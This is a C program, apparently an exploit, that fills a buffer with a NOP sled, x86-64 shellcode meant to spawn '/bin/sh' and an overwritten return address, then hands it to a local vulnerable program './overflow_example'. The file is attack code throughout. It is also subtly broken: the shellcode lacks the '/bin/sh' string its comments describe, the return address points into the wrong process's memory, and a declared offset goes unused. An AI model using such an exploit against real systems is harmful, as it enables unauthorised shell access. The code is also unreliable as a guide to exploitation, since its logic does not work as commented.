#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[] =
    "\x48\x31\xc0"                              // xor rax, rax
    "\x48\x89\xc2"                              // mov rdx, rax
    "\x48\x89\xf3"                              // mov rbx, rsi
    "\x48\x8d\x3d\x04\x00\x00\x00"              // lea rdi, [rip + 0x4] (address of "/bin/sh")
    "\x50"                                      // push rax (NULL terminator for args)
    "\x48\x89\xe7"                              // mov rdi, rsp (pointer to "/bin/sh")
    "\x50"                                      // push rax (NULL terminator for envp)
    "\x48\x89\xe6"                              // mov rsi, rsp (pointer to argv)
    "\x48\x31\xc0"                              // xor rax, rax
    "\xb0\x3b"                                  // mov al, 59 (execve syscall number)
    "\x0f\x05";                                 // syscall

int main(int argc, char *argv[]) {
    unsigned long ret;
    char *buffer;
    int offset = 36;         // Offset to reach the return address
    int buffer_size = 200;   // Total buffer size

    // Allocate a buffer larger than necessary
    buffer = (char *)malloc(buffer_size);
    if (!buffer) {
        perror("malloc");
        return 1;
    }
    
    // Zero out the buffer
    memset(buffer, 0, buffer_size);
    
    // Fill the buffer with NOPs (0x90)
    memset(buffer, 0x90, buffer_size);

    // Calculate the return address
    ret = (unsigned long)(buffer + buffer_size - sizeof(shellcode) - 1); // Point to the shellcode

    // Overwrite the return address (last 8 bytes of the buffer)
    *((unsigned long *)(buffer + buffer_size - 8)) = ret;

    // Copy shellcode to the end of the NOP sled
    memcpy(buffer + buffer_size - sizeof(shellcode) - 1, shellcode, sizeof(shellcode) - 1);

    // Execute the vulnerable program with the crafted input
    execl("./overflow_example", "./overflow_example", buffer, NULL);

    // Free allocated buffer (not strictly necessary since program will exit)
    free(buffer);

    return 0;
}
